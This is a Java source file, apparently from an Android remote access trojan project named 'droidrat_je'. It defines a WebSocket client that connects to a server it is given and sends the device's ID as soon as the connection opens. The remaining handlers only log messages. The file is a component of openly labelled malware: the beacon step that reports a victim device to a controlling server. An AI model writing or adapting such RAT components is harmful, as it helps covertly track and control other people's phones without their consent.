package com.je_chen.droidrat_je.util.socket.websocket;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.je_chen.droidrat_je.rat.modules.appsinfo.getinfo.GetPackagesInfo;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;

public class Websockets extends WebSocketClient {

    private final GetPackagesInfo getPackagesInfo;
    private final String TAG = "WebSocket";

    public Websockets(URI serverUri, PackageManager packageManager, Context context) {
        super(serverUri);
        getPackagesInfo = new GetPackagesInfo(packageManager, context);
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        Log.e(TAG, "onOpen");
        this.send("deviceID " + getPackagesInfo.getDeviceId());
    }

    @Override
    public void onMessage(String message) {
        Log.e(TAG, "Message : " + message);
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        Log.e(TAG, "onClose " + reason);
    }

    @Override
    public void onError(Exception ex) {
        Log.e(TAG, "onError " + ex.getMessage());
    }
}
